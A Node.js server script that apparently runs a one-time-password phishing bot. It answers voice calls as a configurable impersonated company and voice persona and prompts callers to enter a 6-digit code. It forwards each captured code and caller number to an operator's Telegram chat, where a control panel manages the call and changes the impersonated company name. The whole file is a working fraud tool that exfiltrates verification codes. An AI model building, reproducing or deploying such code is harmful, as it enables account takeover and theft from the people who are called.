const express=require("express")
const bodyParser=require("body-parser")
const fetch=require("node-fetch")

const app=express()
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended:false}))

const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
const CHAT_ID=process.env.CHAT_ID

let settings={
company:"Support",
digits:6,
assistant:"Nova"
}

const assistants={
Nova:"Polly.Amy",
Lyra:"Polly.Emma",
Orion:"Polly.Brian",
Astra:"Polly.Joanna",
Kairo:"Polly.Matthew",
Solara:"Polly.Amy"
}

let activeCall=null
let lastCaller=null
let lastCode=null
let callStart=null
let panelMessage=null
let logs=[]

async function tg(method,data){
await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(data)
})
}

function duration(){
if(!callStart)return "00:00"
const s=Math.floor((Date.now()-callStart)/1000)
const m=String(Math.floor(s/60)).padStart(2,"0")
const sec=String(s%60).padStart(2,"0")
return `${m}:${sec}`
}

async function createPanel(){

const r=await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
chat_id:CHAT_ID,
text:"📞 IVR CONTROL PANEL",
reply_markup:{
inline_keyboard:[
[
{text:"📊 Status",callback_data:"status"},
{text:"📜 Logs",callback_data:"logs"}
],
[
{text:"☎ Call Last",callback_data:"lastcall"},
{text:"🤖 Voice",callback_data:"voice"}
],
[
{text:"⚙ Company",callback_data:"company"},
{text:"🔢 Digits",callback_data:"digits"}
]
]
}
})
})

const data=await r.json()
panelMessage=data.result.message_id
}

async function updatePanel(){

if(!panelMessage)return

await tg("editMessageText",{
chat_id:CHAT_ID,
message_id:panelMessage,
text:
`📞 IVR CONTROL PANEL

Caller: ${lastCaller||"none"}
Code: ${lastCode||"waiting"}

⏱ Duration: ${duration()}

Company: ${settings.company}
Digits: ${settings.digits}
Voice: ${settings.assistant}

Choose action:`,

reply_markup:{
inline_keyboard:[
[
{text:"✔ Confirm",callback_data:"confirm"},
{text:"🔁 Ask Again",callback_data:"redo"}
],
[
{text:"⛔ Hang Up",callback_data:"hangup"}
],
[
{text:"📊 Status",callback_data:"status"},
{text:"📜 Logs",callback_data:"logs"}
],
[
{text:"☎ Call Last",callback_data:"lastcall"}
]
]
}
})
}

setInterval(updatePanel,2000)

app.get("/",(req,res)=>{
res.send("Server running")
})

app.post("/ivr",async(req,res)=>{

const digits=req.body.Digits
const caller=req.body.From

if(!digits){

res.type("text/xml")
res.send(`
<Response>
<Gather numDigits="${settings.digits}" action="/ivr" method="POST">
<Say voice="${assistants[settings.assistant]}">
Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
</Say>
</Gather>
</Response>
`)
return
}

lastCaller=caller
lastCode=digits
activeCall=caller
callStart=Date.now()

logs.unshift({
caller,
code:digits,
time:new Date().toLocaleTimeString()
})

await tg("sendMessage",{
chat_id:CHAT_ID,
text:`📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}`
})

res.type("text/xml")
res.send(`<Response><Pause length="20"/></Response>`)

})

app.post("/telegram",async(req,res)=>{

const update=req.body

if(update.message){

const text=update.message.text

if(text==="/status"){
await tg("sendMessage",{chat_id:CHAT_ID,
text:`📊 STATUS

Active: ${activeCall||"none"}
Caller: ${lastCaller||"none"}
Digits: ${settings.digits}
Company: ${settings.company}
Voice: ${settings.assistant}`
})
}

if(text==="/logs"){

if(logs.length===0){
await tg("sendMessage",{chat_id:CHAT_ID,text:"No logs yet."})
}else{

let msg="📜 CALL LOGS\n\n"

logs.slice(0,10).forEach((l,i)=>{
msg+=`${i+1}. ${l.caller}
Code: ${l.code}
Time: ${l.time}

`
})

await tg("sendMessage",{chat_id:CHAT_ID,text:msg})
}
}

if(text.startsWith("/company")){
settings.company=text.replace("/company ","")
}

if(text.startsWith("/digits")){
const d=parseInt(text.split(" ")[1])
if(!isNaN(d))settings.digits=d
}

if(text.startsWith("/voice")){
const v=text.split(" ")[1]
if(assistants[v])settings.assistant=v
}

}

if(update.callback_query){

const data=update.callback_query.data

if(data==="confirm"){
activeCall=null
callStart=null
await tg("sendMessage",{chat_id:CHAT_ID,text:"✔ Call confirmed and ended."})
}

if(data==="redo"){
await tg("sendMessage",{chat_id:CHAT_ID,text:"🔁 Asking caller again."})
}

if(data==="hangup"){
activeCall=null
callStart=null
await tg("sendMessage",{chat_id:CHAT_ID,text:"⛔ Call ended."})
}

if(data==="logs"){
let msg="📜 CALL LOGS\n\n"
logs.slice(0,5).forEach((l,i)=>{
msg+=`${i+1}. ${l.caller} | ${l.code}\n`
})
await tg("sendMessage",{chat_id:CHAT_ID,text:msg})
}

}

res.sendStatus(200)
})

const PORT=process.env.PORT||3000

app.listen(PORT,async()=>{
console.log("Server running")
await createPanel()
})
